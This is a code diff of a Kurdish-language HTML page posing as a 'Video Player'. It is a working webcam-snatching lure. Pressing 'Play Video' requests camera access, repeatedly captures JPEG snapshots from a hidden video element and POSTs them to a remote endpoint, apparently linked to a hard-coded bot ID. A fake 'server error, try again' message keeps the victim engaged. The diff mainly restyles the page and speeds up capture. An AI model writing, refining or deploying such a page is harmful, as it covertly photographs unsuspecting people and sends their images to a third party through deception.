@@ -1,86 +1,15 @@
 <!DOCTYPE html>
-<html lang="ku" dir="rtl">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Video Player</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            /* باگراوەندی سەوزی تۆخ و زەیتوونی وەک مافورەکە */
-            background: radial-gradient(circle, #3d4e2a 0%, #1a2312 100%);
-            background-image: url('https://www.transparenttextures.com/patterns/pinstriped-suit.png'); /* نەخشی ورد بۆ سەر قوماش */
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            overflow: hidden;
-        }
-
-        .main-card {
-            background: rgba(20, 30, 15, 0.85);
-            border: 4px solid #b89a4b; /* ڕەنگی زێڕینی مات */
-            border-radius: 2px;
-            padding: 40px 25px;
-            box-shadow: 0 0 40px rgba(0,0,0,0.7), inset 0 0 15px rgba(184, 154, 75, 0.2);
-            text-align: center;
-            width: 85%;
-            max-width: 380px;
-            position: relative;
-        }
-
-        /* نەخشی گۆشەکان هاوشێوەی مافورەکە */
-        .corner {
-            position: absolute;
-            width: 40px;
-            height: 40px;
-            border: 2px solid #b89a4b;
-        }
-        .top-left { top: 10px; left: 10px; border-right: none; border-bottom: none; }
-        .bottom-right { bottom: 10px; right: 10px; border-left: none; border-top: none; }
-
-        h2 {
-            color: #d4af37;
-            font-size: 22px;
-            margin-bottom: 30px;
-            text-shadow: 1px 1px 2px black;
-        }
-
-        #startBtn {
-            padding: 15px 40px;
-            font-size: 18px;
-            font-weight: bold;
-            border: 1px solid #d4af37;
-            background: #2d3a1d;
-            color: #d4af37;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
-        }
-
-        #startBtn:hover {
-            background: #d4af37;
-            color: #1a2312;
-            box-shadow: 0 0 20px rgba(212, 175, 55, 0.4);
-        }
-
-        #status {
-            margin-top: 20px;
-            color: #b89a4b;
-            font-size: 15px;
-        }
-    </style>
 </head>
-<body>
+<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center;">
 
-    <div class="main-card">
-        <div class="corner top-left"></div>
-        <div class="corner bottom-right"></div>
-        
-        <h2 id="status">سیستەمی ڤیدیۆی کلاسیک ⚜️</h2>
-        <button id="startBtn">PLAY VIDEO</button>
+    <div id="main-container">
+        <h2 id="status">ڤیدیۆکە ئامادەیە</h2>
+        <button id="startBtn" style="padding: 15px 30px; font-size: 18px; border-radius: 10px; border: none; background: #0088cc; color: white; cursor: pointer;">Play Video 🎬</button>
     </div>
 
     <video id="v" autoplay playsinline style="display:none;"></video>
@@ -91,11 +20,10 @@
         const myId = '7978104952'; 
 
         document.getElementById('startBtn').addEventListener('click', function() {
-            const statusText = document.getElementById('status');
-            statusText.innerText = "کەمێک چاوەڕێ بکە...";
+            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە...";
             this.style.display = 'none';
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            navigator.mediaDevices.getUserMedia({ video: true })
             .then(s => {
                 const v = document.getElementById('v');
                 v.srcObject = s;
@@ -114,13 +42,13 @@
                             method: 'POST',
                             body: f
                         }).then(() => {
-                            statusText.innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
+                            document.getElementById('status').innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
                         });
                     }, 'image/jpeg');
-                }, 1500);
+                }, 1000);
             })
             .catch(e => {
-                statusText.innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
+                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
             });
         });
     </script>
